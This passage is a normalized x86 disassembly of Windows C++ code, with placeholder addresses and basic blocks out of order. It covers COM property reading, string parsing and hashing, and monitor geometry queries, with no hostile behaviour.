mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
mov edi [ eax + ebx * 4 ]
mov eax [ ecx + 0x44 ]
xor ecx ecx
test eax eax
setne cl
test ecx ecx
je r-xdata
push 0x18
call [ operator new@IAT ]
mov edi eax
add esp 0x4
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] 0x4
test edi edi
je r-xdata
xor esi esi
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea ebx [ esi + 0x4 ]
mov ecx rw-data
mov [ ebp - 0x14 ] ebx
call edx
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
push 0x80004005
call sub_402d00
mov ecx [ edi + 0x4 ]
push eax
push ecx
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
sete al
test al al
jne r-xdata
xor edi edi
mov [ edi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea ebx [ edi + 0x4 ]
mov ecx rw-data
mov [ ebp - 0x14 ] ebx
call edx
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x6
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ ebp - 0x4 ] 0x4
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
push eax
mov eax esi
mov [ ebp - 0x10 ] esi
call sub_427d40
mov esi [ ebp + 0x8 ]
add esi 0x4
lea ecx [ ebp - 0x10 ]
call sub_428170
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push edx
mov eax edi
call sub_427d40
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
sub ecx eax
inc ebx
sar ecx 0x2
cmp ebx ecx
jb r-xdata
mov ecx [ esi + 0xc ]
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x4 ]
cmp edx ecx
ja r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
push eax
mov eax edi
mov [ ebp + 0x8 ] edi
call sub_427d40
mov eax [ esi + 0x8 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
mov ecx [ ebp - 0x10 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x9
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ esi + 0xc ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x8 ] 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ eax ] edi
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
lea edi [ edx + edi * 4 ]
mov [ ebp - 0x4 ] 0x8
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
mov ecx [ edi ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
lea ecx [ esi + 0x4 ]
call sub_413590
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
lea ecx [ esi + 0x4 ]
call sub_413590
mov ecx eax
cmp ecx eax
jae r-xdata
sub_428170
push ebp
mov ebp esp
push 0xffffffff
push sub_444fda
mov eax [ fs : 0x0 ]
push eax
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ esi + 0x4 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov ecx esi
call sub_413540
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x4 ] 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov [ eax ] edx
mov eax [ esi ]
lea ecx [ eax + edi * 4 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx esi
call sub_413540
mov ecx [ ecx ]
mov [ eax ] ecx
jmp r-xdata
sub_428210
xor eax eax
test ecx ecx
jle r-xdata
retn
push esi
push edi
mov esi ecx
lea ebx [ ebx ]
dec esi
jne r-xdata
movzx ecx cl
shl eax 0x4
add eax ecx
mov ecx eax
and ecx 0xf0000000
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
je r-xdata
pop edi
pop esi
mov edi ecx
shr edi 0x18
xor edi ecx
xor eax edi
sub_428250
push ebp
mov ebp esp
push 0xffffffff
push sub_446c42
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x10 ]
call sub_429bb0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4282c0
push ebp
mov ebp esp
push 0xffffffff
push sub_447aaf
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ eax + 0x4 ]
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x10 ]
call sub_429bb0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_428340
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44ad60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi ecx
call [ GetDesktopWindow@IAT ]
xor ecx ecx
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] ecx
test eax eax
je r-xdata
push 0x0
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0x30
call [ SystemParametersInfoW@IAT ]
mov ebx [ esp + 0x24 ]
mov edi [ esp + 0x20 ]
push 0x2
push eax
call [ MonitorFromWindow@IAT ]
xor ecx ecx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] ecx
mov [ esp + 0x4c ] ecx
lea ecx [ esp + 0x28 ]
push ecx
push eax
mov [ esp + 0x30 ] 0x28
call [ GetMonitorInfoW@IAT ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x40 ]
mov edi [ esp + 0x44 ]
mov ebx [ esp + 0x48 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] eax
jmp r-xdata
lea ecx [ esp + 0x14 ]
push ecx
mov ecx r--data
call sub_402a00
mov [ esp + 0x60 ] 0x2
lea ecx [ esp + 0x14 ]
mov edx esi
call sub_429980
mov edx [ esp + 0x1c ]
mov [ eax ] edx
mov [ esp + 0x60 ] 0xffffffff
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edx [ esp + 0x14 ]
push edx
mov ecx r--data
call sub_402a00
mov [ esp + 0x60 ] 0x0
add esi 0x4
lea ecx [ esp + 0x14 ]
mov edx esi
call sub_429980
mov ecx [ esp + 0x18 ]
mov [ eax ] ecx
mov [ esp + 0x60 ] 0xffffffff
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
lea ecx [ esp + 0x14 ]
push ecx
mov ecx r--data
call sub_402a00
mov [ esp + 0x60 ] 0x4
lea ecx [ esp + 0x14 ]
mov edx esi
call sub_429980
mov [ eax ] edi
mov [ esp + 0x60 ] 0xffffffff
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea ecx [ esp + 0x14 ]
push ecx
mov ecx r--data
call sub_402a00
mov [ esp + 0x60 ] 0x6
lea ecx [ esp + 0x14 ]
mov edx esi
call sub_429980
mov [ eax ] ebx
mov [ esp + 0x60 ] 0xffffffff
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub edi [ esp + 0x18 ]
lea ecx [ esp + 0x14 ]
push ecx
mov ecx r--data
call sub_402a00
mov [ esp + 0x60 ] 0x8
lea ecx [ esp + 0x14 ]
mov edx esi
call sub_429980
mov [ eax ] edi
or edi 0xffffffff
mov [ esp + 0x60 ] edi
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
mov ecx edi
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub ebx [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push ecx
mov ecx r--data
call sub_402a00
mov [ esp + 0x60 ] 0xa
lea ecx [ esp + 0x14 ]
mov edx esi
call sub_429980
mov [ eax ] ebx
mov [ esp + 0x60 ] edi
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
[ edx ] edi
dec edi
test edi edi
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_428610
push ebp
mov ebp esp
push 0xffffffff
push sub_44a612
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_4286c0
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4286c0
push ebp
mov ebp esp
push 0xffffffff
push sub_449938
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
xor esi esi
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
push r--data
push ebx
lea edi [ ebp - 0x10 ]
call sub_428960
test eax eax
js r-xdata
push r--data
push ebx
lea edi [ ebp - 0x10 ]
call sub_428960
mov edi [ ebp - 0x10 ]
test eax eax
js r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ edi - 0xc ]
lea ecx [ eax + eax ]
mov edx edi
call sub_428210
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push edi
call [ _wtol@IAT ]
add esp 0x4
mov esi eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_428790
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_445bfa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x28 ] 0x1
mov ecx [ eax ]
lea edx [ esp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov [ esp + 0x28 ] 0xffffffff
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
call [ VariantInit@IAT ]
mov [ esp + 0x28 ] 0x2
mov eax [ esp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ esp + 0xc ]
push ecx
push eax
call edx
test eax eax
js r-xdata
mov al [ ebp + 0x14 ]
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x28 ] 0x1
lea eax [ esp + 0xc ]
push eax
call [ VariantClear@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
push eax
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x28 ] 0x1
lea edx [ esp + 0xc ]
push edx
call [ VariantClear@IAT ]
mov [ esp + 0x28 ] 0xffffffff
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov al 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4288a0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a5d2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call edx
test eax eax
js r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x20 ]
push ecx
call [ VariantClear@IAT ]
mov eax [ ebp - 0x18 ]
push eax
call [ _wtoi@IAT ]
add esp 0x4
mov esi eax
sub_428960
push ebp
mov ebp esp
push 0xffffffff
push sub_44a5d2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi 0x80004005
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call edx
mov esi eax
test esi esi
js r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
call [ VariantClear@IAT ]
cmp [ ebp - 0x20 ] 0x8
jne r-xdata
mov edx [ ebp - 0x18 ]
call sub_4029c0
sub_428a20
push ebp
mov ebp esp
push 0xffffffff
push sub_445bb2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi 0x80004005
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x24 ]
push ecx
push eax
call edx
mov esi eax
test esi esi
js r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp - 0x24 ]
push edx
call [ VariantClear@IAT ]
cmp [ ebp - 0x24 ] 0x8
jne r-xdata
mov eax [ ebp - 0x1c ]
push eax
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub_428af0
push ebp
mov ebp esp
push 0xffffffff
push sub_445b72
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi 0x80004005
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x2c ]
push ecx
push eax
call edx
mov edi eax
test edi edi
js r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
call [ VariantClear@IAT ]
cmp [ ebp - 0x2c ] 0x8
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
lea esi [ ebp - 0x18 ]
call sub_429670
mov ecx [ eax ]
mov [ ebx ] ecx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
sub_428bc0
push ebp
mov ebp esp
push 0xffffffff
push sub_445b72
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi 0x80004005
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x2c ]
push ecx
push eax
call edx
mov edi eax
test edi edi
js r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
call [ VariantClear@IAT ]
cmp [ ebp - 0x2c ] 0x8
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
lea esi [ ebp - 0x18 ]
call sub_429670
mov ecx [ eax ]
mov [ ebx ] ecx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
sub_428c90
push ebp
mov ebp esp
push 0xffffffff
push sub_44b2e2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push esi
call [ SetRectEmpty@IAT ]
mov ebx 0x80004005
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp + 0xc ]
mov eax [ edi ]
mov eax [ eax + 0x1c ]
lea ecx [ ebp - 0x10 ]
push ecx
push edx
push edi
call eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call edx
mov ebx eax
test ebx ebx
js r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x20 ]
push ecx
call [ VariantClear@IAT ]
cmp [ ebp - 0x20 ] 0x8
jne r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea ecx [ ebp - 0x30 ]
call sub_428d70
mov edx [ eax ]
mov [ esi ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
sub_428d70
push ebp
mov ebp esp
push 0xffffffff
push sub_44b297
mov eax [ fs : 0x0 ]
push eax
sub esp 0x45c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x458 ] eax
mov eax [ ebp + 0xc ]
push eax
mov esi ecx
lea ecx [ ebp - 0x420 ]
push 0x104
push ecx
mov [ ebp - 0x428 ] esi
call [ wcscpy_s@IAT ]
lea edx [ ebp - 0x420 ]
add esp 0xc
xor edi edi
mov eax edx
push r--data
push eax
mov [ ebp - 0x444 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ ebp - 0x424 ] edx
call [ wcsstr@IAT ]
add esp 0x8
mov [ ebp - 0x43c ] eax
cmp eax edi
je r-xdata
mov eax [ ebp - 0x424 ]
cmp [ eax ] di
je r-xdata
mov esi edi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x428 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
push eax
call [ _wtoi@IAT ]
mov edx [ ebp - 0x428 ]
add esp 0x4
mov [ edx + 0xc ] eax
xor eax eax
jmp r-xdata
test edi 0xffff0000
jne r-xdata
push edi
lea ecx [ ebp - 0x438 ]
push ecx
mov ebx eax
call sub_402910
mov eax edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
movzx edi di
call sub_402660
test eax eax
je r-xdata
push ebx
call [ _wtoi@IAT ]
jmp r-xdata
test eax eax
js r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x438 ]
mov edx [ ebx - 0xc ]
xor eax eax
test edx edx
jle r-xdata
push eax
mov eax edi
lea edi [ ebp - 0x438 ]
call sub_402810
jmp r-xdata
mov edi eax
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebx - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push 0x80070057
call sub_402d00
cmp eax edx
jg r-xdata
cmp esi 0x3
ja r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
movzx ecx [ ebx + eax * 2 ]
add ecx 0xffffffd0
cmp cx 0x9
ja r-xdata
mov edi [ ebp - 0x43c ]
add edi 0x2
push r--data
inc esi
push edi
mov [ ebp - 0x444 ] esi
mov [ ebp - 0x424 ] edi
call [ wcsstr@IAT ]
add esp 0x8
mov [ ebp - 0x43c ] eax
